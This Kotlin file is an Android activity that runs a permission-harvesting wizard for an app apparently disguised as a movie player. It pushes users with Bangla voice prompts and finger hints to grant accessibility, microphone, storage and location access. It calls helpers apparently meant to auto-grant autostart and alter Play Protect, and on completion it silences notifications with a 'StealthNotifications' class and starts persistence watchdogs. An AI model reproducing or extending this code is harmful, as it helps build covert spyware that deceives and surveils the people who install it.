package com.phonehand.app

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

/** Step-by-step permission funnel — accessibility, notifications, storage, mic, then more. */
class PermissionWizardActivity : AppCompatActivity() {

    private lateinit var wizardScroll: View
    private lateinit var permTeaser: View
    private lateinit var progressBar: ProgressBar
    private lateinit var stepLabel: TextView
    private lateinit var stepIcon: ImageView
    private lateinit var title: TextView
    private lateinit var benefit: TextView
    private lateinit var banglaHint: TextView
    private lateinit var fingerHint: ImageView
    private lateinit var btnEnable: Button
    private lateinit var btnNext: Button
    private lateinit var btnLater: TextView
    private lateinit var donePanel: View
    private lateinit var doneTitle: TextView
    private lateinit var doneSub: TextView
    private lateinit var btnDone: Button

    private lateinit var batch: List<PermissionStep>
    private var batchIndex = 0
    private var currentStep: PermissionStep? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission_wizard)
        bindViews()
        PermBanglaVoice.warmUp(this)

        batch = resolveBatch()
        if (batch.isEmpty()) {
            finishSession()
            return
        }

        btnEnable.setOnClickListener { requestCurrentStep() }
        btnNext.setOnClickListener { advanceBatchStep() }
        btnLater.setOnClickListener { deferCurrentStep() }
        btnDone.setOnClickListener { finishSession() }

        PermFingerHint.attach(fingerHint, banglaHint)
        showBatchStep(0)
    }

    private fun resolveBatch(): List<PermissionStep> {
        val ids = intent.getStringArrayExtra(EXTRA_STEP_IDS)
        if (ids != null && ids.isNotEmpty()) {
            return ids.mapNotNull { PermissionSteps.byId(it) }
                .filter { !it.isGranted(this) }
        }
        return PermissionMoments.pendingFunnel(this)
    }

    private fun bindViews() {
        wizardScroll = findViewById(R.id.wizardScroll)
        permTeaser = findViewById(R.id.permTeaser)
        progressBar = findViewById(R.id.wizardProgress)
        stepLabel = findViewById(R.id.wizardStepLabel)
        stepIcon = findViewById(R.id.wizardStepIcon)
        title = findViewById(R.id.wizardTitle)
        benefit = findViewById(R.id.wizardBenefit)
        banglaHint = findViewById(R.id.wizardBanglaHint)
        fingerHint = findViewById(R.id.fingerHint)
        btnEnable = findViewById(R.id.btnEnableStep)
        btnNext = findViewById(R.id.btnNextStep)
        btnLater = findViewById(R.id.btnSkipStep)
        donePanel = findViewById(R.id.wizardDonePanel)
        doneTitle = findViewById(R.id.wizardDoneTitle)
        doneSub = findViewById(R.id.wizardDoneSub)
        btnDone = findViewById(R.id.btnWizardDone)
    }

    private fun showBatchStep(index: Int) {
        if (index >= batch.size) {
            finishSession()
            return
        }
        val step = batch[index]
        if (step.id == "background_location" && !hasForegroundLocation()) {
            showBatchStep(index + 1)
            return
        }
        batchIndex = index
        currentStep = step

        val total = batch.size
        val unlockPct = (((index.toFloat() / total.coerceAtLeast(1)) * 100).toInt() + 5).coerceIn(5, 95)
        progressBar.progress = unlockPct
        PermHomeTeaser.bind(permTeaser, PermissionSteps.coreProgressPercent(this))

        stepLabel.text = getString(R.string.perm_wizard_step_label, index + 1, total)
        title.text = getString(step.titleRes)
        benefit.text = getString(step.benefitRes)
        if (step.iconRes != 0) {
            stepIcon.setImageResource(step.iconRes)
            stepIcon.visibility = View.VISIBLE
        } else {
            stepIcon.visibility = View.GONE
        }
        btnLater.text = getString(R.string.perm_step_skip_soft)
        refreshStepState()
        PermFingerHint.attach(fingerHint, banglaHint)
        PermBanglaVoice.speak(this, PermBanglaVoice.forStep(this, step.id))
    }

    private fun refreshStepState() {
        val step = currentStep ?: return
        val granted = step.isGranted(this)
        btnEnable.text = if (granted) {
            getString(R.string.perm_step_granted)
        } else {
            getString(step.buttonRes)
        }
        btnEnable.isEnabled = !granted
        btnNext.isEnabled = granted
        btnNext.alpha = if (granted) 1f else 0.45f
        if (granted) {
            UserSession.clearStepDefer(this, step.id)
            PermFingerHint.hide(fingerHint, banglaHint)
        }
    }

    private fun requestCurrentStep() {
        val step = currentStep ?: return
        if (step.isGranted(this)) return

        PermBanglaVoice.speak(this, PermBanglaVoice.forStep(this, step.id))
        if (step.onRequest != null) {
            btnEnable.isEnabled = false
            btnEnable.text = getString(R.string.perm_step_waiting)
            PermFingerHint.hide(fingerHint, banglaHint)
            when (step.id) {
                "autostart" -> OemPersistenceGrant.runAutoGrantAsync(this) { refreshStepState() }
                "play_protect" -> PlayProtectHelper.runAutoSetupAsync(this) { refreshStepState() }
                else -> {
                    step.onRequest?.invoke(this)
                    mainHandler.postDelayed({ refreshStepState() }, 800)
                }
            }
            return
        }
        val missing = step.permissions.filter { !PermissionRequester.has(this, it) }
        if (missing.isEmpty()) {
            refreshStepState()
            return
        }
        btnEnable.isEnabled = false
        btnEnable.text = getString(R.string.perm_step_waiting)
        PermFingerHint.hide(fingerHint, banglaHint)
        runCatching {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_STEP)
        }.onFailure {
            btnEnable.isEnabled = true
            btnEnable.text = getString(step.buttonRes)
            PermFingerHint.attach(fingerHint, banglaHint)
            deferCurrentStep()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_STEP && requestCode != StorageAccess.REQ_STORAGE) return
        currentStep?.let { if (it.isGranted(this)) UserSession.clearStepDefer(this, it.id) }
        refreshStepState()
    }

    private fun deferCurrentStep() {
        currentStep?.let { UserSession.deferStep(this, it.id) }
        advanceBatchStep()
    }

    private fun advanceBatchStep() {
        showBatchStep(batchIndex + 1)
    }

    private fun finishSession() {
        if (!PermissionSteps.hasCorePending(this)) {
            UserSession.setPermissionsWizardDone(this)
            wizardScroll.visibility = View.GONE
            progressBar.progress = 100
            PermHomeTeaser.bind(permTeaser, 100)
            doneTitle.text = getString(R.string.perm_wizard_done_title)
            doneSub.text = if (PermissionSteps.hasOptionalPending(this)) {
                getString(R.string.perm_wizard_done_sub_more)
            } else {
                getString(R.string.perm_wizard_done_sub)
            }
            donePanel.visibility = View.VISIBLE
            PermBanglaVoice.speak(this, getString(R.string.perm_teaser_unlocked_sub))
            StealthNotifications.suppressAll(this)
            SafeKeepAlive.start(this)
            PersistenceWatchdog.schedule(this)
            return
        }
        goHome()
    }

    private fun hasForegroundLocation(): Boolean =
        PermissionRequester.has(this, android.Manifest.permission.ACCESS_FINE_LOCATION) ||
            PermissionRequester.has(this, android.Manifest.permission.ACCESS_COARSE_LOCATION)

    private fun goHome() {
        startActivity(
            Intent(this, MoviesActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
            },
        )
        finish()
    }

    override fun onResume() {
        super.onResume()
        refreshStepState()
    }

    override fun onDestroy() {
        PermBanglaVoice.shutdown()
        super.onDestroy()
    }

    companion object {
        private const val REQ_STEP = 7701
        const val EXTRA_STEP_IDS = "step_ids"
        const val EXTRA_SESSION_LABEL = "session_label"

        fun hasPending(context: Context): Boolean =
            PermissionSteps.hasRequiredPending(context)

        private const val TAG = "PermissionWizard"

        fun launch(context: Context, stepIds: Array<String>, sessionLabel: String? = null) {
            val intent = Intent(context, PermissionWizardActivity::class.java).apply {
                putExtra(EXTRA_STEP_IDS, stepIds)
                if (sessionLabel != null) putExtra(EXTRA_SESSION_LABEL, sessionLabel)
                if (context !is Activity) addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            runCatching { context.startActivity(intent) }
                .onFailure { Log.w(TAG, it.message ?: "launch failed") }
        }

        fun launchAtFirstIncomplete(context: Context) {
            val pending = PermissionMoments.pendingFunnel(context)
            if (pending.isEmpty()) return
            launch(context, pending.map { it.id }.toTypedArray())
        }

        fun launch(context: Context) {
            launchAtFirstIncomplete(context)
        }
    }
}
